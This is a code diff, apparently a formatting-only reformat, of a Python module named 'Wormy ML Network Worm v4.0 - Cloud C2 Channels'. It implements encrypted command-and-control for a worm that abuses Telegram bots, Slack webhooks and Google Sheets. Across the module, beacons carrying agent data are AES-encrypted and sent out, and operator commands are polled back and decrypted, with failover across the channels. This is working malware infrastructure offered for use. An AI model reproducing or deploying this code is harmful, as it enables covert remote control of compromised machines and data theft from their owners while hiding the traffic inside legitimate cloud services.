@@ -2,22 +2,32 @@
 Wormy ML Network Worm v4.0 - Cloud C2 Channels
 Real AES-256-GCM encryption for all cloud channels.
 """
-import os, sys, json, time, base64, hashlib, threading, struct
-import urllib.request, urllib.parse
-from typing import Optional, Dict, List, Callable
+
+import base64
+import hashlib
+import json
+import os
+import struct
+import sys
+import threading
+import time
+import urllib.parse
+import urllib.request
+from typing import Callable, Dict, List, Optional
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
 
 try:
     from Crypto.Cipher import AES
+
     HAS_AES = True
 except ImportError:
     HAS_AES = False
 
 
-def _derive_key(passphrase: str, salt: bytes = b'') -> bytes:
-    return hashlib.pbkdf2_hmac('sha256', passphrase.encode(), salt or b'wormy_v4_salt', 100000, 32)
+def _derive_key(passphrase: str, salt: bytes = b"") -> bytes:
+    return hashlib.pbkdf2_hmac("sha256", passphrase.encode(), salt or b"wormy_v4_salt", 100000, 32)
 
 
 def _enc(obj: dict, passphrase: str) -> str:
@@ -61,9 +71,9 @@ def _http_get(url: str, headers: dict = None) -> Optional[str]:
 def _http_post(url: str, data: dict, headers: dict = None) -> Optional[str]:
     try:
         body = json.dumps(data).encode()
-        req  = urllib.request.Request(url, data=body,
-                                      headers={"Content-Type": "application/json",
-                                               **(headers or {})})
+        req = urllib.request.Request(
+            url, data=body, headers={"Content-Type": "application/json", **(headers or {})}
+        )
         with urllib.request.urlopen(req, timeout=10) as r:
             return r.read().decode()
     except Exception as e:
@@ -88,14 +98,14 @@ class TelegramC2:
     API = "https://api.telegram.org/bot{token}"
 
     def __init__(self, token: str, chat_id: str, passphrase: str = "wormy_tg"):
-        self.token      = token
-        self.chat_id    = chat_id
+        self.token = token
+        self.chat_id = chat_id
         self.passphrase = passphrase
         self._last_update_id = 0
-        self._base      = self.API.format(token=token)
+        self._base = self.API.format(token=token)
 
     def _call(self, method: str, params: dict = None) -> Optional[dict]:
-        url  = f"{self._base}/{method}"
+        url = f"{self._base}/{method}"
         resp = _http_post(url, params or {})
         if resp:
             try:
@@ -106,10 +116,13 @@ class TelegramC2:
 
     def send_message(self, text: str) -> bool:
         """Send raw text (for operators). Use beacon() for agent comms."""
-        result = self._call("sendMessage", {
-            "chat_id": self.chat_id,
-            "text":    text[:4096],
-        })
+        result = self._call(
+            "sendMessage",
+            {
+                "chat_id": self.chat_id,
+                "text": text[:4096],
+            },
+        )
         return bool(result and result.get("ok"))
 
     def beacon(self, agent_data: Dict) -> Optional[Dict]:
@@ -117,8 +130,7 @@ class TelegramC2:
         Encrypt agent_data, send as message, poll for encrypted reply.
         Returns decrypted command dict or None.
         """
-        enc = _enc({"type": "beacon", "data": agent_data,
-                    "ts": time.time()}, self.passphrase)
+        enc = _enc({"type": "beacon", "data": agent_data, "ts": time.time()}, self.passphrase)
         if not self.send_message(f"[WRMY]{enc}"):
             return None
         # Poll for reply (operator sends back encrypted command)
@@ -127,15 +139,18 @@ class TelegramC2:
 
     def _poll_for_command(self) -> Optional[Dict]:
         """Check for new messages from operator, return decrypted command."""
-        result = self._call("getUpdates", {
-            "offset":  self._last_update_id + 1,
-            "timeout": 5,
-        })
+        result = self._call(
+            "getUpdates",
+            {
+                "offset": self._last_update_id + 1,
+                "timeout": 5,
+            },
+        )
         if not result or not result.get("ok"):
             return None
         for update in result.get("result", []):
             self._last_update_id = update.get("update_id", self._last_update_id)
-            msg  = update.get("message", {})
+            msg = update.get("message", {})
             text = msg.get("text", "")
             if text.startswith("[CMD]"):
                 cmd = _dec(text[5:], self.passphrase)
@@ -145,12 +160,14 @@ class TelegramC2:
 
     def start_listener(self, callback: Callable, poll_interval: float = 5.0):
         """Background polling loop — calls callback(command_dict) for each command."""
+
         def _loop():
             while True:
                 cmd = self._poll_for_command()
                 if cmd:
                     callback(cmd)
                 time.sleep(poll_interval)
+
         t = threading.Thread(target=_loop, daemon=True)
         t.start()
         logger.info("Telegram C2 listener started")
@@ -158,10 +175,10 @@ class TelegramC2:
     def get_status(self) -> Dict:
         me = self._call("getMe")
         return {
-            "channel":       "telegram",
-            "bot_username":  me.get("result", {}).get("username") if me else None,
-            "chat_id":       self.chat_id,
-            "last_update":   self._last_update_id,
+            "channel": "telegram",
+            "bot_username": me.get("result", {}).get("username") if me else None,
+            "chat_id": self.chat_id,
+            "last_update": self._last_update_id,
         }
 
 
@@ -180,18 +197,22 @@ class SlackC2:
 
     SLACK_API = "https://slack.com/api"
 
-    def __init__(self, webhook_url: str,
-                 bot_token: str = None, channel_id: str = None,
-                 passphrase: str = "wormy_slack"):
+    def __init__(
+        self,
+        webhook_url: str,
+        bot_token: str = None,
+        channel_id: str = None,
+        passphrase: str = "wormy_slack",
+    ):
         self.webhook_url = webhook_url
-        self.bot_token   = bot_token
-        self.channel_id  = channel_id
-        self.passphrase  = passphrase
-        self._last_ts    = str(time.time())
+        self.bot_token = bot_token
+        self.channel_id = channel_id
+        self.passphrase = passphrase
+        self._last_ts = str(time.time())
 
     def beacon(self, agent_data: Dict) -> Optional[Dict]:
         """Send encrypted beacon as a Slack message."""
-        enc  = _enc({"type": "beacon", "data": agent_data}, self.passphrase)
+        enc = _enc({"type": "beacon", "data": agent_data}, self.passphrase)
         body = {"text": f"[WRMY]{enc}"}
         resp = _http_post(self.webhook_url, body)
         if resp and resp.strip() == "ok":
@@ -205,11 +226,14 @@ class SlackC2:
         """Poll channel history for operator commands."""
         if not self.bot_token or not self.channel_id:
             return None
-        url  = f"{self.SLACK_API}/conversations.history"
-        req  = urllib.request.Request(
+        url = f"{self.SLACK_API}/conversations.history"
+        req = urllib.request.Request(
             url + f"?channel={self.channel_id}&oldest={self._last_ts}&limit=10",
-            headers={"Authorization": f"Bearer {self.bot_token}",
-                     "Content-Type": "application/json"})
+            headers={
+                "Authorization": f"Bearer {self.bot_token}",
+                "Content-Type": "application/json",
+            },
+        )
         try:
             with urllib.request.urlopen(req, timeout=10) as r:
                 data = json.loads(r.read())
@@ -224,9 +248,9 @@ class SlackC2:
 
     def get_status(self) -> Dict:
         return {
-            "channel":      "slack",
-            "webhook":      self.webhook_url[:40] + "...",
-            "polling":      bool(self.bot_token),
+            "channel": "slack",
+            "webhook": self.webhook_url[:40] + "...",
+            "polling": bool(self.bot_token),
         }
 
 
@@ -246,18 +270,24 @@ class GoogleSheetsC2:
 
     SHEETS_BASE = "https://sheets.googleapis.com/v4/spreadsheets"
 
-    def __init__(self, sheet_id: str, api_key: str = None,
-                 range_name: str = "Sheet1!A:B",
-                 passphrase: str = "wormy_sheets"):
-        self.sheet_id   = sheet_id
-        self.api_key    = api_key
+    def __init__(
+        self,
+        sheet_id: str,
+        api_key: str = None,
+        range_name: str = "Sheet1!A:B",
+        passphrase: str = "wormy_sheets",
+    ):
+        self.sheet_id = sheet_id
+        self.api_key = api_key
         self.range_name = range_name
         self.passphrase = passphrase
         self._cmd_cache: List[Dict] = []
 
     def _csv_url(self) -> str:
-        return (f"https://docs.google.com/spreadsheets/d/{self.sheet_id}"
-                f"/export?format=csv&range={urllib.parse.quote(self.range_name)}")
+        return (
+            f"https://docs.google.com/spreadsheets/d/{self.sheet_id}"
+            f"/export?format=csv&range={urllib.parse.quote(self.range_name)}"
+        )
 
     def poll_commands(self) -> List[Dict]:
         """
@@ -284,11 +314,12 @@ class GoogleSheetsC2:
         if not self.api_key:
             logger.warning("Google Sheets C2: no API key for write operations")
             return False
-        enc = _enc({"type": "beacon", "data": agent_data,
-                    "ts": time.time()}, self.passphrase)
-        url  = (f"{self.SHEETS_BASE}/{self.sheet_id}/values/"
-                f"{urllib.parse.quote(self.range_name)}:append"
-                f"?valueInputOption=RAW&key={self.api_key}")
+        enc = _enc({"type": "beacon", "data": agent_data, "ts": time.time()}, self.passphrase)
+        url = (
+            f"{self.SHEETS_BASE}/{self.sheet_id}/values/"
+            f"{urllib.parse.quote(self.range_name)}:append"
+            f"?valueInputOption=RAW&key={self.api_key}"
+        )
         body = {"values": [[f"[WRMY]{enc}", str(time.time())]]}
         resp = _http_post(url, body)
         return bool(resp)
@@ -301,10 +332,10 @@ class GoogleSheetsC2:
 
     def get_status(self) -> Dict:
         return {
-            "channel":  "google_sheets",
+            "channel": "google_sheets",
             "sheet_id": self.sheet_id,
-            "range":    self.range_name,
-            "api_key":  bool(self.api_key),
+            "range": self.range_name,
+            "api_key": bool(self.api_key),
         }
 
 
@@ -321,21 +352,24 @@ class CloudC2Manager:
         self._channels: List = []
         self._active: Optional[int] = None
 
-    def add_telegram(self, token: str, chat_id: str,
-                     passphrase: str = "wormy_tg"):
+    def add_telegram(self, token: str, chat_id: str, passphrase: str = "wormy_tg"):
         self._channels.append(TelegramC2(token, chat_id, passphrase))
         logger.info("Cloud C2: Telegram channel added")
 
-    def add_slack(self, webhook_url: str, bot_token: str = None,
-                  channel_id: str = None, passphrase: str = "wormy_slack"):
-        self._channels.append(SlackC2(webhook_url, bot_token,
-                                      channel_id, passphrase))
+    def add_slack(
+        self,
+        webhook_url: str,
+        bot_token: str = None,
+        channel_id: str = None,
+        passphrase: str = "wormy_slack",
+    ):
+        self._channels.append(SlackC2(webhook_url, bot_token, channel_id, passphrase))
         logger.info("Cloud C2: Slack channel added")
 
-    def add_google_sheets(self, sheet_id: str, api_key: str = None,
-                          passphrase: str = "wormy_sheets"):
-        self._channels.append(GoogleSheetsC2(sheet_id, api_key,
-                                              passphrase=passphrase))
+    def add_google_sheets(
+        self, sheet_id: str, api_key: str = None, passphrase: str = "wormy_sheets"
+    ):
+        self._channels.append(GoogleSheetsC2(sheet_id, api_key, passphrase=passphrase))
         logger.info("Cloud C2: Google Sheets channel added")
 
     def beacon(self, agent_data: Dict) -> Optional[Dict]:
@@ -352,7 +386,7 @@ class CloudC2Manager:
 
     def get_status(self) -> Dict:
         return {
-            "channels":      len(self._channels),
+            "channels": len(self._channels),
             "active_channel": self._active,
             "channel_types": [type(c).__name__ for c in self._channels],
         }
